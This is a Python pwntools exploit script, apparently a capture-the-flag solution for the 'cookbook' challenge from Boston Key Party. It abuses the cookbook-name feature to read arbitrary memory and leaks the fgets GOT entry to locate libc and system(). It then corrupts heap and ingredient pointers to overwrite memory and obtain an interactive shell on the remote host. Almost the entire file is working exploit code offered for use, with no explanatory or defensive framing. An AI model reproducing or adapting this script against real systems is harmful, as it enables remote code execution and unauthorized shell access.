#!/usr/bin/env python2

import pwn
import struct
import binascii
import base64
import time

local = True

def p64(x):
    return struct.pack("<Q", x)
def p32(x):
    return struct.pack("<I", x)
def up32(x):
    return struct.unpack("<I", x)[0]
def ups32(x):
    return struct.unpack("<i", x)[0]
if local:
    HOST = '127.0.0.1'
    PORT = 1337
    libc_elf = pwn.ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    HOST = 'cookbook.bostonkey.party'
    PORT = 5000
    libc_elf = pwn.ELF('./libc.so.6')
r = pwn.remote(HOST, PORT)

elf = pwn.ELF('./cookbook')
system_off = libc_elf.symbols['system']
fgets_off = libc_elf.symbols['fgets']

def sl(l):
    r.sendline(l)

def main_menu():
    r.readuntil('[R]emove cookbook name\n[q]uit\n')

def recipe_menu():
    r.readuntil('[p]rint current recipe\n[q]uit\n')

def ingr_menu():
    r.readuntil("[q]uit (doesn't save)?\n[e]xport saving changes (doesn't quit)?\n")

RECIPE_LEN = 0x40c

def read_addr(addr):
    sl('c') #create recipe menu
    recipe_menu()
    sl('n') #create new recipe
    recipe_menu()
    sl('d') #discard recipe
    recipe_menu()
    sl('q') #back to main
    main_menu()

    sl('g') #give cookbook name
    r.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(RECIPE_LEN))
    sl('\x00'*8 + 'A'*(0x7c-8) + p32(addr))
    r.readuntil('the new name of the cookbook is')

    main_menu()
    sl('c') #create recipe menu
    recipe_menu()
    sl('p') #print recipe
    r.readuntil('recipe type: ')
    leak = r.readuntil('total cost :')
    ret = leak[:-(len('total cost :')+2)]
    recipe_menu()
    sl('q') #back to main
    main_menu()

    sl('R') #remove cookbook name
    main_menu()

    return ret

def read_ptr(addr):
    data = ''
    while(len(data) < 4):
        last_read = read_addr(addr)
        if(len(last_read) == 0):
            data += '\x00'
        else:
            data += last_read
    return up32(data[:4])

CURR_INGR = 0x0804d09c
INGR_LIST = 0x0804d094

def corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr):
    sl('a') #add ingr
    ingr_menu()
    sl('n') #new ingr
    ingr_menu()
    sl('s') #set calories (obj)
    sl('0')
    ingr_menu()
    sl('p') #set price (next)
    sl('{}'.format(ups32(p32(0x804cff8))))
    ingr_menu()
    sl('q') #back to main
    main_menu()

    print('ingr_list_ptr {:x}'.format(ingr_list_ptr))

    sl('c') #create recipe menu
    recipe_menu()
    sl('n') #create new recipe
    recipe_menu()
    sl('d') #discard recipe
    recipe_menu()
    sl('q') #back to main
    main_menu()

    sl('g') #give cookbook name
    r.readuntil("(hex because you're both a chef and a hacker!) : ")
    sl('{:x}'.format(0x40c))
    fake_recipe = ''
    fake_recipe += p32(ingr_list_ptr) #ingr_list
    fake_recipe += p32(CURR_INGR-4) #ingr_cnt_list

    sl(fake_recipe)
    r.readuntil('the new name of the cookbook is')
    main_menu()

    sl('c') #create recipe menu
    recipe_menu()
    sl('r') #remove ingredient
    r.readuntil('which ingredient to remove? ')
    sl('tomato\x00') #should be the second ingredient
    recipe_menu()
    sl('q') #back to main
    main_menu()

    sl('a') #add ingr
    ingr_menu()

    raw_input('go?')

    # CURRENT_INGREDIENT == 0x804cff8
    # memcpy((char *CURRENT_INGREDIENT) + 8, "sh; \x00\x00\x00\x00" + p32(system_addr)*32)

    sl('g') #give name to ingr
    sl('sh; \x00\x00\x00\x00' + p32(system_addr)*32)
    r.interactive()


r.readuntil("what's your name?\n")
r.sendline("MYNAME")
main_menu()

FGETS_GOT = 0x0804d020

ingr_list_ptr = read_ptr(INGR_LIST)
print 'ingr list ptr: 0x{:x}'.format(ingr_list_ptr)
fgets_addr = read_ptr(FGETS_GOT)
libc_addr = fgets_addr - fgets_off
system_addr = libc_addr + system_off
print 'fgets at: 0x{:x}'.format(fgets_addr)
print 'libc at: 0x{:x}'.format(libc_addr)
print 'system at: 0x{:x}'.format(system_addr)
corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)
